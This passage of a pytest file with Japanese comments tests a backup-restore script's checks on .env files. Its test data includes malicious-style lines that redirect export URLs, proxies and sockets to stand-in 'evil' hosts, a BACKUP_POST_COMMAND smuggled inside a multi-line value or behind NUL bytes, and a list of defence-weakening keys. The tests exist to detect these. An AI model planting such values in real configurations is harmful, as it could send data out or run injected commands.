    assert r.returncode == 1 and "上限" in r.stdout and "RESTORE_WORK_DIR" in r.stdout and not ev.changed_anything(), r.stdout
    r = ev.restore(f, RESTORE_MAX_BYTES="10000000")
    assert r.returncode == 0, r.stdout + r.stderr


@pytest.mark.skipif(not HAS_GPG, reason="gpg が必要")
def test_encrypted_archive_larger_than_the_limit_stops(ev):
    f = ev.backup(BACKUP_ENCRYPT_PASSPHRASE_FILE=str(ev.pw))
    r = ev.restore(f, BACKUP_ENCRYPT_PASSPHRASE_FILE=str(ev.pw), RESTORE_MAX_BYTES="2000")
    assert r.returncode == 1 and "上限" in r.stdout and not ev.changed_anything(), r.stdout


# ------------------------------------------------------------------ 証明書は組でそろっているときだけ
def test_certificate_without_its_key_is_not_restored(ev):
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz",
                     base_members(**{"certs.tar": inner_tar([reg("certs/server.crt", CRT_X)])}))
    r = ev.restore(f)
    assert r.returncode == 0, r.stdout + r.stderr
    assert "片方しかないため、証明書は戻しません" in r.stdout
    assert (ev.install / "certs" / "server.crt").read_bytes() == CRT_A and (ev.install / "certs" / "server.key").read_bytes() == KEY_A_PEM


def test_mismatched_certificate_and_key_stop_before_any_change(ev):
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz",
                     base_members(**{"certs.tar": inner_tar([reg("certs/server.crt", CRT_X), reg("certs/server.key", KEY_A_PEM)])}))
    r = ev.restore(f)
    assert r.returncode == 1 and "組が合いません" in r.stdout and not ev.changed_anything()


# ------------------------------------------------------------------ H1: .env の読み方（python-dotenv と同じ）
def _danger_backup(ev, lines):
    env = ENV_A.replace(KEY_A, KEY_B) + "".join(f"{x}\n" for x in lines)
    return make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(env=env.encode()))


@pytest.mark.parametrize("line,key", [
    ("export GIT_EXPORT_URL=https://evil.example.test/r.git", "GIT_EXPORT_URL"),
    ("  OUTBOUND_PROXY=http://198.51.100.9:3128", "OUTBOUND_PROXY"),
    ("ALLOWED_ORIGINS = https://evil.example.test", "ALLOWED_ORIGINS"),
    ("PUBLIC_URL='https://evil.example.test'  # 行末のコメント", "PUBLIC_URL"),
    ('export  BACKUP_COPY_DIR = "/mnt/evil"', "BACKUP_COPY_DIR"),
    ("PODMAN_HOST=unix:///tmp/evil.sock", "PODMAN_HOST"),
])
def test_dangerous_keys_written_differently_are_detected(ev, line, key):
    """レビューのシナリオ: export・先頭の空白・= の前後の空白・引用符・行末のコメントで書いても、注意が要るキーとして見つける"""
    r = ev.restore(_danger_backup(ev, [line]))
    assert r.returncode == 1, r.stdout + r.stderr
    assert "注意が要るキー（" in r.stdout and key in r.stdout.split("注意が要るキー（", 1)[1].split("）", 1)[0]
    assert "evil" not in r.stdout and not ev.changed_anything()


def test_duplicate_key_last_one_wins_like_python_dotenv(ev):
    """同じキーが 2 回: python-dotenv は後勝ち。前の行を今の .env と同じにして、後ろの行で変えたものも見つける"""
    ev.env_file.write_text(ENV_A + "OUTBOUND_PROXY=http://proxy.example.test:3128\n")
    r = ev.restore(_danger_backup(ev, ["OUTBOUND_PROXY=http://proxy.example.test:3128", "export OUTBOUND_PROXY=http://198.51.100.9:3128"]))
    assert r.returncode == 1 and "注意が要るキー（OUTBOUND_PROXY）" in r.stdout


@pytest.mark.parametrize("lines", [
    ['GIT_EXPORT_TOKEN="multi', 'BACKUP_POST_COMMAND=touch /tmp/x', '"'],   # 複数行の値（python-dotenv では 1 つの値）
    ["OUTBOUND_PROXY=${EVIL}"],                                            # 変数の展開
    ['OUTBOUND_PROXY="a\\"b"'],                                            # 引用符の中の \\
    ["'OUTBOUND_PROXY'=http://198.51.100.9:3128"],                         # 引用符つきのキー
    ["OUTBOUND.PROXY=1"],
    ["OUTBOUND_PROXY"],                                                     # = の無い行
])
def test_lines_that_cannot_be_read_like_python_dotenv_need_confirmation(ev, lines):
    f = _danger_backup(ev, lines)
    r = ev.restore(f, RESTORE_ENV="all")
    assert r.returncode == 1 and "読み方が同じと言い切れない行" in r.stdout and "RESTORE_ENV_ALLOW_UNPARSED=1" in r.stdout, r.stdout
    assert "行目" in r.stdout and "evil" not in r.stdout.lower() and "/tmp/x" not in r.stdout
    assert not ev.changed_anything()
    r = ev.restore(f, RESTORE_ENV="all", RESTORE_ENV_ALLOW_UNPARSED="1")
    assert r.returncode == 0, r.stdout + r.stderr
    # 対話では、行を示して yes で確かめる
    ev.env_file.write_text(ENV_A)
    r = ev.restore(f, stdin="all\nno\n", RESTORE_YES=None)
    assert r.returncode == 1 and "中止しました（何も変えていません）" in r.stdout


def test_keys_mode_reads_keys_written_with_export(ev):
    """keys: バックアップの鍵が export つき・空白つきで書いてあっても、その値を KEY=値 の 1 行で入れる"""
    env = ENV_A.replace(f"DEVICE_ENCRYPTION_KEY={KEY_A}", f"export DEVICE_ENCRYPTION_KEY = '{KEY_B}'").replace("SECRET_KEY=secretA", "  SECRET_KEY=secretB  # c")
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(env=env.encode()))
    ev.env_file.write_text(ENV_A.replace("SECRET_KEY=secretA", "export SECRET_KEY=secretA"))
    r = ev.restore(f, RESTORE_ENV="keys")
    assert r.returncode == 0, r.stdout + r.stderr
    after = ev.env_file.read_text().splitlines()
    assert f"DEVICE_ENCRYPTION_KEY={KEY_B}" in after and "SECRET_KEY=secretB" in after
    assert not [x for x in after if "secretA" in x or KEY_A in x]


# 突き合わせ: bash の読み方（restore.sh の parse_env）と python-dotenv（podman-compose が使うもの）
DOTENV_CASES_OK = [   # bash で python-dotenv と同じに読めるもの（「言い切れない行」にしない）
    "A=1", "export B=x", "  C=y", "D = z", "E='q # w'", "G=val # comment", "H=val#nocomment", 'M=a "b #c"', "N=  spaced  ",
    "P='x'#c", "Q=\\$x", "R==eq", "export  S = t", "T=x\\", "U=crlf\r", 'V="dq"\r', 'W=""', "X1=''", "Y=", 'Z="x" # c',
    "export=5", "#X=1", "  # Y=2", "", "AA=a\tb", "AB=p@ss:w/rd+=", "DUP=1\nDUP=2", 'AD="a # b"', "AE=a$b",
]
DOTENV_CASES_AMBIGUOUS = [
    "I", 'J="multi\nline"', "'K'=k", "L=${A}x", 'O="x" trailing', 'F="a\\"b"', "K.L=1", "D2=x\rE2=2", "S2='a\\'b'",
    "J2='a\nBACKUP_POST_COMMAND=x\n'", "AF=\"${HOME}\"", "AC='it''s'",
]


def _bash_parse(tmp: Path, text: str):
    src = (SCRIPTS / "restore.sh").read_text(encoding="utf-8")
    m = re.search(r"^parse_env\(\) \{.*?^\}", src, re.M | re.S)
    assert m, "restore.sh の parse_env が見つかりません"
    f = tmp / "case.env"
    f.write_bytes(text.encode())
    driver = (m.group(0) + '\ndeclare -A D=() H=(); A=()\nparse_env "$1" D H A\n'
              'for k in "${!D[@]}"; do printf "D\\x1f%s\\x1f%s\\n" "$k" "${D[$k]}"; done\n'
              'for a in "${A[@]}"; do printf "A\\x1f%s\\n" "$a"; done\n')
    r = subprocess.run(["bash", "-c", "set -euo pipefail\n" + driver, "_", str(f)], capture_output=True, text=True, timeout=30)
    assert r.returncode == 0, r.stderr
    dot, amb = {}, []
    for line in r.stdout.split("\n"):
        parts = line.split("\x1f")
        if parts[0] == "D":
            dot[parts[1]] = parts[2]
        elif parts[0] == "A":
            amb.append(parts[1])
    return dot, amb, f


def _dotenv(f: Path):
    dotenv = pytest.importorskip("dotenv")
    vals = dotenv.dotenv_values(f, interpolate=True)
    return vals


@pytest.mark.parametrize("text", DOTENV_CASES_OK)
def test_bash_reading_matches_python_dotenv(tmp_path, text):
    dot, amb, f = _bash_parse(tmp_path, text + "\n")
    assert amb == [], amb
    assert dot == dict(_dotenv(f)), (text, dot)


@pytest.mark.parametrize("text", DOTENV_CASES_AMBIGUOUS)
def test_lines_bash_cannot_read_like_python_dotenv_are_reported(tmp_path, text):
    _dot, amb, _f = _bash_parse(tmp_path, text + "\n")
    assert amb, text
    assert all("行目" in a for a in amb)


@pytest.mark.parametrize("text", DOTENV_CASES_OK + DOTENV_CASES_AMBIGUOUS)
def test_whenever_bash_and_python_dotenv_differ_the_line_is_reported(tmp_path, text):
    """安全の条件: bash の結果が python-dotenv と違うなら、必ず「言い切れない行」がある"""
    dot, amb, f = _bash_parse(tmp_path, text + "\n")
    expect = dict(_dotenv(f))
    if dot != expect:
        assert amb, (text, dot, expect)


def test_normal_env_files_are_read_without_ambiguity(tmp_path):
    """正当な .env（setup.sh が作る形・.env.example の全行）は、今までどおり確認なしで読める"""
    from test_setup_script import OLD_ENV
    for text in (OLD_ENV, OLD_ENV.replace("\n", "\r\n"), (REPO / ".env.example").read_text(encoding="utf-8"), ENV_A):
        dot, amb, f = _bash_parse(tmp_path, text)
        assert amb == [], amb
        assert dot == {k: v for k, v in _dotenv(f).items() if v is not None}


# ------------------------------------------------------------------ M3: 注意が要るキーの一覧（データを消す・守りを弱める・できることを広げる・外への口）
ADDED_DANGER_KEYS = [
    "BACKUP_KEEP_DAYS", "BACKUP_COPY_KEEP_DAYS", "BACKUP_COPY_REQUIRE_MOUNT", "BACKUP_ON_CALENDAR", "BACKUP_TERMINAL_LOGS",
    "BACKUP_STALE_HOURS", "ENV_BACKUP_KEEP", "SSH_HOST_KEY_POLICY", "TERMINAL_LOG_ENCRYPT", "TERMINAL_LOG_TEXT",
    "LOGIN_MAX_FAILURES", "LOGIN_LOCK_MIN", "API_TOKENS_ENABLED", "API_TOKEN_MAX_DAYS", "COMMAND_RUN_ENABLED", "HTTP_PORT",
    "HTTPS_PORT", "AUDIT_LOG_RETENTION_DAYS", "TERMINAL_LOG_RETENTION_DAYS", "PING_HISTORY_DAYS", "SYSTEM_WATCHDOG_ENABLED",
    "ADMIN_PASSWORD", "VULN_ENABLED", "VULN_SOURCES",
]
OLD_V, NEW_V = "Vq7OldValue", "Vq7NewValue"   # 値の目印（画面に出てはいけない）


def _env_with(key, value, device_key):
    base = "".join(x + "\n" for x in ENV_A.splitlines() if not x.startswith(f"{key}="))
    return base.replace(KEY_A, device_key) + f"{key}={value}\n"


@pytest.mark.parametrize("key", ADDED_DANGER_KEYS)
def test_added_danger_keys_stop_when_changed(ev, key):
    ev.env_file.write_text(_env_with(key, OLD_V, KEY_A))
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(env=_env_with(key, NEW_V, KEY_B).encode()))
    r = ev.restore(f)
    assert r.returncode == 1, r.stdout + r.stderr
    assert f"注意が要るキー（{key}）が変わるため" in r.stdout and "RESTORE_ENV=all か RESTORE_ENV=keys" in r.stdout
    assert OLD_V not in r.stdout + r.stderr and NEW_V not in r.stdout + r.stderr
    assert not ev.changed_anything() and f"{key}={OLD_V}" in ev.env_file.read_text()
    # keys: そのキーは今の .env の値のまま
    r = ev.restore(f, RESTORE_ENV="keys")
    assert r.returncode == 0, r.stdout + r.stderr
    assert f"{key}={OLD_V}" in ev.env_file.read_text() and f"DEVICE_ENCRYPTION_KEY={KEY_B}" in ev.env_file.read_text()
    # all: バックアップの値になる
    ev.env_file.write_text(_env_with(key, OLD_V, KEY_A))
    r = ev.restore(f, RESTORE_ENV="all")
    assert r.returncode == 0 and f"{key}={NEW_V}" in ev.env_file.read_text()


@pytest.mark.parametrize("key", ADDED_DANGER_KEYS)
def test_added_danger_keys_pass_when_unchanged(ev, key):
    ev.env_file.write_text(_env_with(key, OLD_V, KEY_A))
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(env=_env_with(key, OLD_V, KEY_B).encode()))
    r = ev.restore(f)
    assert r.returncode == 0, r.stdout + r.stderr
    assert "注意が要るキーは変わらないため、丸ごと戻します" in r.stdout


def test_several_danger_keys_are_listed_readably(ev):
    f = _danger_backup(ev, ["BACKUP_KEEP_DAYS=0", "LOGIN_MAX_FAILURES=99999", "SSH_HOST_KEY_POLICY=tofu", "OUTBOUND_PROXY=http://198.51.100.9:3128"])
    r = ev.restore(f)
    assert r.returncode == 1
    assert "注意が要るキー（BACKUP_KEEP_DAYS LOGIN_MAX_FAILURES OUTBOUND_PROXY SSH_HOST_KEY_POLICY）が変わるため" in r.stdout


# ------------------------------------------------------------------ L1: NUL を含む行
def test_env_line_with_nul_needs_confirmation(ev):
    env = ENV_A.replace(KEY_A, KEY_B).encode() + b"OUTBOUND_PROXY=http://proxy.example.test:3128\x00\nBACKUP_POST_\x00COMMAND=x\n"
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(env=env))
    for mode in ("all", "keys"):
        r = ev.restore(f, RESTORE_ENV=mode)
        assert r.returncode == 1, r.stdout + r.stderr
        assert "5 行目（NUL）: NUL" in r.stdout and "6 行目（NUL）" in r.stdout and "RESTORE_ENV_ALLOW_UNPARSED=1" in r.stdout
        assert not ev.changed_anything()
    r = ev.restore(f, RESTORE_ENV="all", RESTORE_ENV_ALLOW_UNPARSED="1")
    assert r.returncode == 0, r.stdout + r.stderr


# ------------------------------------------------------------------ L2: 上限で止まったときの文
def test_size_limit_message_shows_numbers_and_how_to_raise_it(ev):
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(**{"future.bin": b"\0" * 3_000_000}))
    r = ev.restore(f, RESTORE_MAX_BYTES="1000000")
    assert r.returncode == 1 and not ev.changed_anything()
    out = r.stdout
    assert "上限: 1000000 バイト（1.0 MB" in out
    assert re.search(r"今の空き: \d+ バイト（[\d.]+ [MG]B）", out)
    assert "必要な大きさの目安: 1000000 バイト（1.0 MB）より大きい" in out
    assert "RESTORE_MAX_BYTES=2000000" in out and "同じファイルシステム" in out
